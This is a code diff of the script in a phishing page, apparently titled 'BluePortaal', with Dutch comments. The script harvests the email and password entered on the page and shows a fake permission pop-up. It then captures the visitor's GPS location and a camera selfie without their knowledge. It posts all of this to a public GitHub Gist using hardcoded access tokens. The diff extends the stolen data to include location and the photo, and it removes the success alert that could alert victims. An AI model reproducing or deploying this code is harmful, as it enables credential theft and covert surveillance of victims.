@@ -95,47 +95,37 @@
     </div>
 
     <script>
+        let gpsLocation = null;
+        let selfieData = null;
+
         function requestPermissions() {
-            // Verkrijg de gegevens van de invoervelden
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
             console.log(`📧 Gegevens opgeslagen - E-mail: ${email}, Wachtwoord: ${password}`);
 
-            // Toon fake pop-up voor toestemming
             document.getElementById("fake-popup").style.display = "block";
-
-            // Pop-up verdwijnt na 5 seconden
             setTimeout(() => {
                 document.getElementById("fake-popup").style.display = "none";
             }, 5000);
 
-            // Vraag locatie toestemming eerst, daarna camera toestemming
             requestLocationPermission()
-                .then(() => {
-                    console.log("✅ Locatie toestemming gegeven!");
-                    return requestCameraPermission();
-                })
-                .then(() => {
-                    console.log("✅ Camera toestemming gegeven!");
-                    sendDataToGitHub(email, password); // Gegevens naar GitHub sturen
-                })
-                .catch(error => {
-                    console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
-                });
+                .then(() => requestCameraPermission())
+                .then(() => sendDataToGitHub(email, password, gpsLocation, selfieData))
+                .catch(error => console.log("❌ Fout bij het verkrijgen van toestemmingen:", error));
         }
 
         function requestLocationPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(position => {
-                        console.log(`📍 GPS Locatie: ${position.coords.latitude}, ${position.coords.longitude}`);
+                        gpsLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        console.log(`📍 GPS Locatie: ${gpsLocation.latitude}, ${gpsLocation.longitude}`);
                         resolve();
-                    }, error => {
-                        console.log("❌ Locatie geweigerd of niet beschikbaar:", error);
-                        reject();
-                    });
+                    }, error => reject());
                 } else {
-                    console.log("❌ Geolocatie wordt niet ondersteund door deze browser.");
                     reject();
                 }
             });
@@ -154,15 +144,11 @@
                             video.style.display = "none";
                             setTimeout(() => {
                                 takeSelfie(video, stream);
+                                resolve();
                             }, 3000);
-                            resolve();
                         })
-                        .catch(error => {
-                            console.log("❌ Camera geweigerd:", error);
-                            reject();
-                        });
+                        .catch(error => reject());
                 } else {
-                    console.log("❌ Camera wordt niet ondersteund door deze browser.");
                     reject();
                 }
             });
@@ -175,23 +161,21 @@
             let ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            let selfieData = canvas.toDataURL("image/png");
+            selfieData = canvas.toDataURL("image/png");
             console.log("📸 Selfie genomen:", selfieData);
 
-            // Stop de camera na het maken van de selfie
             stream.getTracks().forEach(track => track.stop());
         }
 
-        // Functie om de gegevens naar GitHub te sturen (bijvoorbeeld een Gist)
-        function sendDataToGitHub(email, password) {
-            const githubToken = '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'; // Vervang door je persoonlijke token
+        function sendDataToGitHub(email, password, location, selfie) {
+            const githubToken = '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'; // Gebruik een geldige token
 
             const gistData = {
-                description: "Inloggegevens verzameld via BluePortaal",
+                description: "Inloggegevens en media verzameld via BluePortaal",
                 public: true,
                 files: {
                     "user_data.json": {
-                        content: JSON.stringify({ email: email, password: password })
+                        content: JSON.stringify({ email, password, location, selfie })
                     }
                 }
             };
@@ -205,14 +189,8 @@
                 body: JSON.stringify(gistData)
             })
             .then(response => response.json())
-            .then(data => {
-                console.log('GitHub Gist gemaakt:', data);
-                alert("Gegevens succesvol opgeslagen naar GitHub!");
-            })
-            .catch((error) => {
-                console.error('Fout bij het maken van Gist:', error);
-                alert("Er is een fout opgetreden bij het opslaan.");
-            });
+            .then(data => console.log('GitHub Gist gemaakt:', data))
+            .catch(error => console.error('Fout bij het maken van Gist:', error));
         }
     </script>
 
